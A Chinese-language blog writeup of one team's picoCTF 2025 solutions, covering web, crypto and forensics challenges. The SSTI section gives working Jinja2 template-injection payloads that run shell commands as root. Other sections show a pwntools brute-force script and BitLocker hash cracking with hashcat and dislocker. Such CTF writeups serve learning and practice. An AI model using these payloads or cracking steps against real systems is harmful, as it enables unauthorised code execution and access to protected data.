---
title: PicoCTF 2025
published: 2025-03-20
updated: 2025-07-09
description: "picoCTF 2025 writeup"
image: ""
tags: ["CTF Writeup", "picoCTF"]
category: "CTF Writeup"
draft: false
---

這是第一次參加 picoCTF !!!  
還有電神隊友們一起

- [MercuryNearTheMoon](https://github.com/MercuryNearTheMoon)
- [nickchengtw](https://github.com/nickchengtw)
- [HaBiOwO](https://github.com/HaBiOwO)

:::note[團隊排名]

231 th / 10460
![team rank - 231/10460](/assets/picoCTF2025/summary/image-2.png)

:::

:::note[團隊成績]

![team score - 5510](/assets/picoCTF2025/summary/image.png)
:::

:::note[個人成績]

~~專門寫水題~~

![individual score - 1860](/assets/picoCTF2025/summary/image-1.png)
:::

我覺得最可惜的是 `flags are stepic`，真的覺得已經把能試的隱寫術工具全部試過一遍了  
還是沒有試出來 (╥﹏╥)  
過一陣子去看大神們的 writeup !

先醬子，下個 ctf 再見 ~

---

後來去看大神的 writeup，是要用 python 套件 `stepic 0.5.0`，原來提示在題目的標題阿 www

---

# PicoCTF 2025

## Web

### Cookie Monster Secret Recipe

用隨便一組帳密去登入

![cookie](/assets/picoCTF2025/Web/CookieMonsterSecretRecipe/image.png)

拿去 decode base64

![flag](/assets/picoCTF2025/Web/CookieMonsterSecretRecipe/image-1.png)

### head-dump

index 中有一則關於 nodejs

![nodejs](/assets/picoCTF2025/Web/head-dump/image.png)

source code 裡面可以看到`#API Documentation`可以連結到`/api-docs`

![api docs](/assets/picoCTF2025/Web/head-dump/image-1.png)

![swagger](/assets/picoCTF2025/Web/head-dump/image-2.png)

在 swagger 中發現 `Diagnosing /heapdump`

![heapdump](/assets/picoCTF2025/Web/head-dump/image-4.png)

按下 Download file

在檔案中找到 flag

![flag](/assets/picoCTF2025/Web/head-dump/image-5.png)

### SSTI1

這一題是 server side template injection  
之前沒有遇過這種題型，先上網搜尋了一下  
參考資料：[[Day11] SSTI (Server Side Template Injection)](https://ithelp.ithome.com.tw/articles/10272749)

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

得到結果

```
uid=0(root) gid=0(root) groups=0(root)
```

Jinja2 SSTI 漏洞允許存取 Python 的 os 模組並執行系統命令

```
{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
```

可以看到有`flag`

![result](/assets/picoCTF2025/Web/SSTI1/image.png)

```
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

得到結果

![flag](/assets/picoCTF2025/Web/SSTI1/image-1.png)

## Crypto

### EVEN RSA CAN BE BROKEN

先按照題目連過去

```sh
nc verbal-sleep.picoctf.net 55822
```

得到

```
N: 15252509958680134355281192790423775780642730018121324095788578219292963353723916232720499483903461184668705060828515811319893114374925851073427408951758226
e: 65537
cyphertext: 4505358946357386625233434478520489616980726252380557529086592189572337871695906872189490934253694515800987194433679204612679402344074107465616766286153989
```

用線上 decoder [RSA Cipher](https://www.dcode.fr/rsa-cipher)

![flag](/assets/picoCTF2025/Crypto/EVEN_RSA_CAN_BE_BROKEN/image.png)

### Guess My Cheese (Part 1)

用[Affine Cipher](https://www.dcode.fr/affine-cipher)去 decode

```
nc verbal-sleep.picoctf.net 58487

*******************************************
***             Part 1                  ***
***    The Mystery of the CLONED RAT    ***
*******************************************

The super evil Dr. Lacktoes Inn Tolerant told me he kidnapped my best friend, Squeexy, and replaced him with an evil clone! You look JUST LIKE SQUEEXY, but I'm not sure if you're him or THE CLONE. I've devised a plan to find out if YOU'RE the REAL SQUEEXY! If you're Squeexy, I'll give you the key to the cloning room so you can maul the imposter...

Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  XCFBPAFTET
Hint: The cheeses are top secret and limited edition, so they might look different from cheeses you're used to!
Commands: (g)uess my cheese or (e)ncrypt a cheese
What would you like to do?
e

What cheese would you like to encrypt? blue
Here's your encrypted cheese:  BNQC
Not sure why you want it though...*squeak* - oh well!

I don't wanna talk to you too much if you're some suspicious character and not my BFF Squeexy!
You have 2 more chances to prove yourself to me!

Commands: (g)uess my cheese or (e)ncrypt a cheese
What would you like to do?
g


   _   _
  (q\_/p)
   /. .\.-.....-.     ___,
  =\_t_/=     /  `\  (
    )\ ))__ __\   |___)
   (/-(/`  `nn---'

SQUEAK SQUEAK SQUEAK

         _   _
        (q\_/p)
         /. .\
  ,__   =\_t_/=
     )   /   \
    (   ((   ))
     \  /\) (/\
      `-\  Y  /
         nn^nn


Is that you, Squeexy? Are you ready to GUESS...MY...CHEEEEEEESE?
Remember, this is my encrypted cheese:  XCFBPAFTET
So...what's my cheese?
PENBRYNDKD

         _   _
        (q\_/p)
         /. .\         __
  ,__   =\_t_/=      .'o O'-.
     )   /   \      / O o_.-`|
    (   ((   ))    /O_.-'  O |
     \  /\) (/\    | o   o  o|
      `-\  Y  /    |o   o O.-`
         nn^nn     | O _.-'
                   '--`

munch...

         _   _
        (q\_/p)
         /. .\         __
  ,__   =\_t_/=      .'o O'-.
     )   /   \      / O o_.-`|
    (   ((   ))      ).-'  O |
     \  /\) (/\      )   o  o|
      `-\  Y  /    |o   o O.-`
         nn^nn     | O _.-'
                   '--`

munch...

         _   _
        (q\_/p)
         /. .\         __
  ,__   =\_t_/=      .'o O'-.
     )   /   \      / O o_.-`|
    (   ((   ))        )'  O |
     \  /\) (/\          )  o|
      `-\  Y  /         ) O.-`
         nn^nn        ) _.-'
                   '--`

MUNCH.............

YUM! MMMMmmmmMMMMmmmMMM!!! Yes...yesssss! That's my cheese!
Here's the password to the cloning room:  picoCTF{}
```

### Guess My Cheese (Part 2)

Part 2 給我們起司名稱的名單，要找出具體加鹽的內容跟起司是甚麼。  
但是當下沒有看出題目的意思，是要以什麼樣的形式去加鹽以及加鹽的位置，所以用 pwntool 去 brute force

```python
from pwn import *
from struct import *

with open("cheese_list.txt", "r") as f:
    cheese_list = f.readlines()
    while True:
        try:
            r = remote("verbal-sleep.picoctf.net", 54640)
            r.recvuntil(b"What would you like to do?")
            r.sendline(b"g")
            cheese = random.choice(cheese_list).strip()
            salt = hex(random.randint(0, 256))[2:]
            print(f"cheese: {cheese}, salt: {salt}")
            r.recvuntil(b"So...what's my cheese?")
            r.sendline(cheese.encode())
            r.recvuntil(b"Annnnd...what's my salt?")
            r.sendline(salt.encode())
            res = r.recvall()
            if b"pico" in res:
                print(res)
                break
        except:
            pass
        r.close()

print("Done")

```

![flag](</assets/picoCTF2025/Crypto/Guess_My_Cheese_(Part_2)/image.png>)

這次的 cheese 是`Gouda`，加鹽的 hex 是`9f`

### hashcrack

![start](/assets/picoCTF2025/Crypto/hashcrack/image.png)

題目提到`weakly hashed`，直接查詢`482c811da5d5b4bc6d497ffa98491e38`

![search](/assets/picoCTF2025/Crypto/hashcrack/image-1.png)

可知這就是`password123`

![second hash](/assets/picoCTF2025/Crypto/hashcrack/image-2.png)

用線上工具[SHA-1 Center](https://sha1.gromweb.com/)

![result2](/assets/picoCTF2025/Crypto/hashcrack/image-3.png)

`b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3`是`letmein`

![third hash](/assets/picoCTF2025/Crypto/hashcrack/image-5.png)

用線上工具[CrackStation](https://crackstation.net/)

![result3](/assets/picoCTF2025/Crypto/hashcrack/image-4.png)

`916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745`是`qwerty098`

![flag](/assets/picoCTF2025/Crypto/hashcrack/image-6.png)

## Forensics

### Bitlocker-1

用 Autopsy 去查看 bitlocker-1.dd

![mount image](/assets/picoCTF2025/Forensics/Bitlocker-1/image.png)

發現`-FVE-FS-`

```sh
sudo apt install john
bitlocker2john -i bitlocker-1.dd > bitlocker_hash.txt
```

```sh
cat bitlocker_hash.txt
Encrypted device bitlocker-1.dd opened, size 100MB
Salt: 2b71884a0ef66f0b9de049a82a39d15b
RP Nonce: 00be8a46ead6da0106000000
RP MAC: a28f1a60db3e3fe4049a821c3aea5e4b
RP VMK: a1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58

UP Nonce: d04d9c58eed6da010a000000
UP MAC: 68156e51e53f0a01c076a32ba2b2999a
UP VMK: fffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d


User Password hash:
$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d
Hash type: User Password with MAC verification (slower solution, no false positives)
$bitlocker$1$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d
Hash type: Recovery Password fast attack
$bitlocker$2$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58
Hash type: Recovery Password with MAC verification (slower solution, no false positives)
$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58
```

破解`Recovery Password`

```sh
hashcat -m 22100 -a 0 bitlocker_hash.txt hashcat-6.2.6/rockyou.txt
```

![hashcat](/assets/picoCTF2025/Forensics/Bitlocker-1/image-1.png)

得到結果

```
$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d:jacqueline
```

所以密碼是`jacqueline`

無法用密碼去解密，所以用金鑰去 recover

```sh
dislocker -V bitlocker-1.dd -p'$bitlocker$2$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58' -- ~/test/mount
```

```sh
sudo mount -o ro,loop ./test/mount/dislocker-file ./test/decrypted/
ls -l ./test/decrypted/
```

![flag.txt](/assets/picoCTF2025/Forensics/Bitlocker-1/image-2.png)

```
cat ./test/decrypted/flag.txt
```

![flag](/assets/picoCTF2025/Forensics/Bitlocker-1/image-3.png)

### Bitlocker-2

```sh
gunzip memdump.mem.gz

git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3/
python3 -m venv venv && . venv/bin/activate
pip install -e ".[dev]"
```

在還沒有打開`bitlocker-2.dd`的情況下在`memdump.mem`中找到 flag

![flag](/assets/picoCTF2025/Forensics/Bitlocker-2/image-1.png)

### Event-Viewing

這一題要找到三段 flag

![logs](/assets/picoCTF2025/Forensics/Event-Viewing/image.png)

![flag1](/assets/picoCTF2025/Forensics/Event-Viewing/image-1.png)

把`cGljb0NURntFdjNudF92aTN3djNyXw==`拿去 decode

因為第一個拿到的是 base64 形式，推斷剩下兩段都是 base64 ，用`尋找`去搜尋`==`或`=`結尾的字串，加快找 flag 的速度

![flag2](/assets/picoCTF2025/Forensics/Event-Viewing/image-2.png)
把`MXNfYV9wcjN0dHlfdXMzZnVsXw==`拿去 decode

```
1s_a_pr3tty_us3ful_
```

![flag3](/assets/picoCTF2025/Forensics/Event-Viewing/image-3.png)

把`MXNfYV9wcjN0dHlfdXMzZnVsXw==`拿去 decode

最後得到 flag

### Ph4nt0m_1ntrud3r

在 wireshark 中可以看到有類似 base64 的東西

![wireshark](/assets/picoCTF2025/Forensics/Ph4nt0m_1ntrud3r/image.png)

```
BNAUd6U=
ezF0X3c0cw==
n0tn4jY=
YZYAvEs=
cGljb0NURg==
hWiUvqQ=
XzM0c3lfdA==
fQ==
gVsRoPU=
w2iRHng=
YmhfNHJfZQ==
oZYrPGE=
+Zyh8zU=
2FljUAw=
z3Iyzvg=
NWU4Yzc4ZA==
gCjvy9o=
G6UztJw=
5h7f9gw=
LpPuQ6w=
bnRfdGg0dA==
QHESHGY=
```

用 cyberchef 可以看到有很像 flag 的東西

![cyberchef](/assets/picoCTF2025/Forensics/Ph4nt0m_1ntrud3r/image-1.png)

題目提到`The attacker has cleverly concealed his moves in well timely manner.`  
對時間進行排序

![sorted](/assets/picoCTF2025/Forensics/Ph4nt0m_1ntrud3r/image-2.png)

```
hWiUvqQ=
w2iRHng=
gVsRoPU=
n0tn4jY=
YZYAvEs=
z3Iyzvg=
BNAUd6U=
gCjvy9o=
+Zyh8zU=
oZYrPGE=
2FljUAw=
5h7f9gw=
QHESHGY=
LpPuQ6w=
G6UztJw=
cGljb0NURg==
ezF0X3c0cw==
bnRfdGg0dA==
XzM0c3lfdA==
YmhfNHJfZQ==
NWU4Yzc4ZA==
fQ==
```

得到新的 flag

![flag](/assets/picoCTF2025/Forensics/Ph4nt0m_1ntrud3r/image-3.png)

### RED

可以在 `red.png` 中找到一首詩

```
Crimson heart, vibrant and bold,
Hearts flutter at your sight.
Evenings glow softly red,
Cherries burst with sweet life.
Kisses linger with your warmth.
Love deep as merlot.
Scarlet leaves falling softly,
Bold in every stroke.
```

仔細看就會發現是藏頭詩，拼起來就是`check LSB`

用工具[pylsb](https://github.com/RenanTKN/pylsb)

```sh
python3 pylsb.py -i red.png -r
```

得到很多看起來像 base64 的字串，拿去解密

![result](/assets/picoCTF2025/Forensics/RED/image.png)

得到 flag

![flag](/assets/picoCTF2025/Forensics/RED/image-1.png)
